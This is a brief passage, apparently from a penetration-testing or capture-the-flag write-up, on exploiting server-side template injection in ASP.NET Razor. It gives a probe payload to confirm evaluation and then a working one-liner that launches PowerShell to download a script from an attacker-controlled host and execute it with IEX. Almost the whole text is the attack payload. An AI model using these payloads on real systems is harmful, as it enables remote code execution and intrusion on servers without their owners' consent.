> We can test a simple payload using:

```
@(5*5)
```

> If we get a response of 25 then we have execution so we can run commands like this one liner for example:

```
@(System.Diagnostics.Process.Start("powershell.exe","-c IEX (New-Object Net.WebClient).DownloadString('http://192.168.x.x/run.txt')"))
```

